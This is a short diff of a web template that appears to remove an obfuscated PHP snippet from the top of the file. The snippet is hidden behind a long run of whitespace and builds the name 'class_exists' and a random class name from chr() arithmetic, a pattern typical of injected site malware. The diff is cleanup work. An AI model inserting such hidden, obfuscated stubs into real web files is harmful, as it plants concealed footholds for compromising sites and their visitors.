@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $UbDtDwx = chr ( 657 - 588 ).chr (105) . chr (113) . "\x5f" . "\x75" . 'z' . "\126" . chr (99) . chr ( 920 - 848 ); $BLaJEJmbpX = 'c' . "\x6c" . chr (97) . "\x73" . chr ( 970 - 855 )."\137" . "\x65" . 'x' . "\x69" . "\x73" . 't' . 's';$zRYZZe = class_exists($UbDtDwx); $UbDtDwx = "24954";$BLaJEJmbpX = "2966";$xDATpoFp = FALSE; ?><style>
+<style>
   .table-color{
     background:#00899f80;
   }
